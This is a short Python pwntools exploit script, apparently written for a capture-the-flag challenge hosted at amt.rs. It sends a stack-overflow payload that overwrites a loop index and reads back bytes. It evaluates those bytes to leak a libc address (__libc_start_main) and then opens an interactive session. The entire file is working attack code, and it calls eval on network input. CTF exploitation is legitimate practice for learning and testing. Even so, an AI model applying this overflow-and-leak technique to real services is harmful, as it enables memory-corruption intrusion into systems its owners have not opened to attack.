#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

p = remote("amt.rs", 31631)


# leak address
payload = b"A" * 8 * 3
payload += p64(0x000000cd00000000)# overwrite i

p.recvuntil(":")
p.sendline(payload)

p.recvline()
leak = eval(b"0x" + p.recv(12))
log.info("leak: " + hex(leak))
__libc_start_main_addr = leak - 0x85
log.info("__libc_start_main: " + hex(__libc_start_main_addr))

p.interactive()
